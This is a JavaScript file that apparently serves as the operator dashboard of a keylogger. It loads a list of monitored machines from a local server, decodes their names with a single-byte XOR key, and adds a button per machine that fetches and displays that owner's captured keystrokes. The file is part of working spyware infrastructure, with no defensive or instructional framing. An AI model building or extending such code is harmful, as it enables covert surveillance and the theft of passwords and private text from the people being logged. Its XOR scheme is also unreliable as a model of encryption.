async function fetchMachinesList(){
    let list = await fetch('http://localhost:5000/api/list_machines_target_get');
    return list.json().then((data) => data)
}

async function fetchKey(){
    let key = await fetch('http://localhost:8000/');
    return key.json().then((data) => data);
}

function decrypt(text, key) {
    let decrypted = [];
    for (let i = 0; i < text.length; i++) {
        let decryptedNum = text.charCodeAt(i) ^ key.charCodeAt(0)
        let decryptedChar = String.fromCharCode(decryptedNum);
        decrypted.push(decryptedChar);
    }
    return decrypted.join('');
}

async function getMachineData(li, button, ownerName) {
    let data = await fetch('http://localhost:5000/api/get_keystrokes/' + ownerName);
    data = await data.json().then((data) => data)
    let p = document.createElement('p');
    p.textContent = JSON.stringify(data, null, 2);
    li.appendChild(p);
}


function addListToElement(machinesList) {
    const listElement = document.getElementById('machine_list_ul');
    machinesList.forEach(machine => {
        const li = document.createElement('li');
        const button = document.createElement('button');
        li.textContent = machine;
        button.textContent = 'get data';
        button.addEventListener('click', () => {getMachineData(li, button, machine)})
        listElement.appendChild(li);
        li.appendChild(button);
    })
    console.log('Adding list to element');
}

async function main(){
    const keyObject = await fetchKey();
    const key = keyObject.key;
    let machinesList = await fetchMachinesList();
    machinesList = machinesList.map(machine => decrypt(machine, key));
    addListToElement(machinesList);
}

document.addEventListener("DOMContentLoaded", main);